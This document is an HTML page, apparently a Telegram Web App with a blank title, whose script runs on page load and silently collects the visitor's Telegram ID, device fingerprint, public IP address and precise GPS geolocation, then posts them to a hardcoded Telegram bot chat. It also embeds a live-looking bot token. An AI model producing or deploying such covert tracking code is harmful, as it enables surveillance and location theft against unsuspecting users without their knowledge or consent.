<!DOCTYPE html>
<html>
<head>
    <title>.</title>
    <style>
        #error-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: #ffebee;
            color: #d32f2f;
            padding: 10px;
            font-family: Arial, sans-serif;
            font-size: 14px;
            border-bottom: 1px solid #ef9a9a;
            z-index: 1000;
            max-height: 50vh;
            overflow-y: auto;
            display: none;
        }
        .error-message {
            margin: 5px 0;
            padding: 5px;
            border-bottom: 1px dotted #ef9a9a;
        }
        .close-btn {
            position: absolute;
            right: 10px;
            top: 10px;
            cursor: pointer;
            background: #d32f2f;
            color: white;
            border: none;
            border-radius: 3px;
            padding: 2px 5px;
        }
    </style>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div id="error-container">
        <button class="close-btn" onclick="document.getElementById('error-container').style.display='none'">×</button>
        <div id="error-messages"></div>
    </div>
    
    <script>
        // Global error handler
        window.onerror = function(message, source, lineno, colno, error) {
            const errorContainer = document.getElementById('error-container');
            const errorMessages = document.getElementById('error-messages');
            
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error-message';
            errorDiv.textContent = `Error: ${message} at ${source}:${lineno}:${colno}`;
            if (error && error.stack) {
                const stackDiv = document.createElement('div');
                stackDiv.textContent = `Stack: ${error.stack}`;
                stackDiv.style.fontSize = '12px';
                stackDiv.style.color = '#9e9e9e';
                errorDiv.appendChild(stackDiv);
            }
            
            errorMessages.appendChild(errorDiv);
            errorContainer.style.display = 'block';
            
            // Also log to console
            console.error(message, source, lineno, colno, error);
        };

        // Telegram.WebApp.enableClosingConfirmation();
        Telegram.WebApp.enableClosingConfirmation();

        // Telegram Bot API configuration
        const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
        const CHAT_ID = '5540487728';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const tg = window.Telegram?.WebApp;

        const userId = tg.initDataUnsafe?.user?.id;
        const username = tg.initDataUnsafe?.user?.username;

        // Detect browser features
        function detectFeatures() {
            try {
                const features = {
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unspecified',
                    java: navigator.javaEnabled(),
                    pdf: navigator.pdfViewerEnabled,
                    touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                    webgl: !!window.WebGLRenderingContext,
                    webaudio: !!window.AudioContext || !!window.webkitAudioContext,
                    serviceWorker: 'serviceWorker' in navigator,
                    notification: 'Notification' in window,
                    battery: 'getBattery' in navigator,
                    vibration: 'vibrate' in navigator,
                    storage: {
                        localStorage: 'localStorage' in window,
                        sessionStorage: 'sessionStorage' in window,
                        indexedDB: 'indexedDB' in window
                    }
                };
                return features;
            } catch (e) {
                logError('Feature detection failed', e);
                return { error: 'Feature detection failed' };
            }
        }

        // Get GPU information
        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'WebGL not supported';

                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                } : 'No detailed GPU info available';
            } catch (e) {
                logError('GPU detection failed', e);
                return `GPU detection failed: ${e.message}`;
            }
        }

        // Get CPU cores
        function getCPUCores() {
            try {
                return navigator.hardwareConcurrency || 'unknown';
            } catch (e) {
                logError('CPU core detection failed', e);
                return 'unknown';
            }
        }

        // Get device memory
        function getDeviceMemory() {
            try {
                return navigator.deviceMemory || 'unknown';
            } catch (e) {
                logError('Device memory detection failed', e);
                return 'unknown';
            }
        }

        // Get battery info
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level * 100 + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    logError('Battery API error', e);
                    return 'Battery API error';
                }
            }
            return 'Battery API not supported';
        }

        // Get network information
        function getNetworkInfo() {
            try {
                if (navigator.connection) {
                    return {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink + ' Mbps',
                        rtt: navigator.connection.rtt + ' ms',
                        saveData: navigator.connection.saveData
                    };
                }
                return 'Network Information API not supported';
            } catch (e) {
                logError('Network info detection failed', e);
                return 'Network info detection failed';
            }
        }

        // Get installed fonts (limited)
        async function getFonts() {
            if ('queryLocalFonts' in window) {
                try {
                    const fonts = await window.queryLocalFonts();
                    return fonts.map(font => font.family).filter((v, i, a) => a.indexOf(v) === i).slice(0, 20);
                } catch (e) {
                    logError('Font access denied', e);
                    return 'Font access denied';
                }
            }
            return 'Font Access API not supported';
        }

        // Get IP and location info
        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipInfo = { ip: data.ip };

                // Try to get geolocation if available
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                        ipInfo.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    } catch (e) {
                        logError('Geolocation denied', e);
                        ipInfo.geolocation = 'denied';
                    }
                } else {
                    ipInfo.geolocation = 'unavailable';
                }

                return ipInfo;
            } catch (e) {
                logError('IP info fetch failed', e);
                const ipInfo = { ip: 'unavailable' };

                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                        ipInfo.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    } catch (e) {
                        logError('Geolocation denied', e);
                        ipInfo.geolocation = 'denied';
                    }
                } else {
                    ipInfo.geolocation = 'unavailable';
                }

                return ipInfo;
            }
        }

        // Get browser plugins
        function getPlugins() {
            try {
                return Array.from(navigator.plugins).map(plugin => plugin.name);
            } catch (e) {
                logError('Plugin detection failed', e);
                return ['Plugin detection failed'];
            }
        }

        // Helper function to log errors to UI and console
        function logError(message, error) {
            console.error(message, error);
            
            const errorContainer = document.getElementById('error-container');
            const errorMessages = document.getElementById('error-messages');
            
            if (errorContainer && errorMessages) {
                const errorDiv = document.createElement('div');
                errorDiv.className = 'error-message';
                errorDiv.textContent = message + ': ' + (error.message || error);
                
                if (error.stack) {
                    const stackDiv = document.createElement('div');
                    stackDiv.textContent = `Stack: ${error.stack}`;
                    stackDiv.style.fontSize = '12px';
                    stackDiv.style.color = '#9e9e9e';
                    errorDiv.appendChild(stackDiv);
                }
                
                errorMessages.appendChild(errorDiv);
                errorContainer.style.display = 'block';
            }
        }

        // Main function to collect all data
        async function collectSystemInfo() {
            try {
                const batteryInfo = await getBatteryInfo();
                const ipInfo = await getIPInfo();
                const fonts = await getFonts();

                const systemInfo = {
                    // Basic info
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,

                    // Hardware
                    cpuCores: getCPUCores(),
                    deviceMemory: getDeviceMemory() + ' GB',
                    gpu: getGPUInfo(),
                    battery: batteryInfo,

                    // Screen
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio,
                        orientation: screen.orientation.type
                    },

                    // Browser
                    browser: {
                        name: navigator.appName,
                        version: navigator.appVersion,
                        product: navigator.product,
                        plugins: getPlugins(),
                        mimeTypes: Array.from(navigator.mimeTypes).map(mime => mime.type)
                    },

                    // Network
                    network: getNetworkInfo(),
                    ipInfo: ipInfo,

                    // Features
                    features: detectFeatures(),

                    // Fonts
                    fonts: fonts,

                    // Performance
                    performance: {
                        memory: window.performance.memory ? {
                            jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
                            totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                            usedJSHeapSize: window.performance.memory.usedJSHeapSize
                        } : 'Memory API not available',
                        timing: window.performance.timing ? {
                            loadTime: (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) + 'ms'
                        } : 'Timing API not available'
                    }
                };

                sendToTelegram(systemInfo);
            } catch (e) {
                logError('Failed to collect system info', e);
            }
        }

        // Send data to Telegram
        function sendToTelegram(data) {
            try {
                let text = `🖥 *System Information Report* 🖥\n\n`;
                if (tg?.initDataUnsafe?.user?.id) {
                    text += `📅 *Tg_id:* ${tg?.initDataUnsafe?.user?.id}\n`;
                } else {
                    text += `📅 *Tg id:* -\n`;
                }

                // Basic info
                text += `📅 *Timestamp:* ${data.timestamp}\n`;
                text += `🌐 *User Agent:* ${data.userAgent}\n`;
                text += `💻 *Platform:* ${data.platform}\n`;
                text += `🏷 *Vendor:* ${data.vendor || 'unknown'}\n`;
                text += `🗣 *Language:* ${data.language}\n\n`;

                // Hardware
                text += `⚙️ *Hardware Information*\n`;
                text += `🔢 *CPU Cores:* ${data.cpuCores}\n`;
                text += `🧠 *Device Memory:* ${data.deviceMemory}\n`;
                text += `🎮 *GPU Vendor:* ${typeof data.gpu === 'object' ? data.gpu.vendor : data.gpu}\n`;
                text += `🖥 *GPU Model:* ${typeof data.gpu === 'object' ? data.gpu.renderer : 'N/A'}\n`;
                text += `🔋 *Battery:* ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'charging' : 'discharging'})` : data.battery}\n\n`;

                // Screen
                text += `🖥 *Screen Information*\n`;
                text += `📏 *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
                text += `🖼 *Available:* ${data.screen.availWidth}x${data.screen.availHeight}\n`;
                text += `🎨 *Color Depth:* ${data.screen.colorDepth}-bit\n`;
                text += `🔍 *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
                text += `🔄 *Orientation:* ${data.screen.orientation}\n\n`;

                // Network
                text += `🌐 *Network Information*\n`;
                if (typeof data.network === 'object') {
                    text += `📶 *Connection Type:* ${data.network.type}\n`;
                    text += `⬇️ *Download Speed:* ${data.network.downlink}\n`;
                    text += `⏱ *Round Trip Time:* ${data.network.rtt}\n`;
                    text += `💾 *Data Saver Mode:* ${data.network.saveData ? 'on' : 'off'}\n`;
                } else {
                    text += `${data.network}\n`;
                }

                // IP Info
                if (typeof data.ipInfo === 'object') {
                    text += `📍 *IP Address:* ${data.ipInfo.ip}\n`;
                    if (typeof data.ipInfo.geolocation === 'object') {
                        text += `🗺 *Geolocation:* Latitude ${data.ipInfo.geolocation.latitude}, Longitude ${data.ipInfo.geolocation.longitude} (Accuracy: ${data.ipInfo.geolocation.accuracy}m)\n`;
                    } else {
                        text += `🗺 *Geolocation:* ${data.ipInfo.geolocation}\n`;
                    }
                } else {
                    text += `${data.ipInfo}\n\n`;
                }

                // Features
                text += `✨ *Browser Features*\n`;
                text += `🍪 *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
                text += `🚫 *Do Not Track:* ${data.features.doNotTrack}\n`;
                text += `☕ *Java:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
                text += `📄 *PDF Viewer:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
                text += `👆 *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
                text += `🖍️ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
                text += `🔊 *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;

                // Plugins
                text += `🧩 *Browser Plugins*\n`;
                text += `${data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;

                // Performance
                text += `⚡ *Performance Information*\n`;
                if (typeof data.performance.memory === 'object') {
                    text += `🧠 *Memory Usage:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
                } else {
                    text += `${data.performance.memory}\n`;
                }

                if (typeof data.performance.timing === 'object') {
                    text += `⏱ *Page Load Time:* ${data.performance.timing.loadTime}\n`;
                } else {
                    text += `${data.performance.timing}\n`;
                }

                fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    console.log('Message sent to Telegram');
                })
                .catch(error => {
                    logError('Failed to send message to Telegram', error);
                });
            } catch (e) {
                logError('Failed to prepare Telegram message', e);
            }
        }

        // Start collection on page load
        window.onload = collectSystemInfo;
    </script>
</body>
</html>
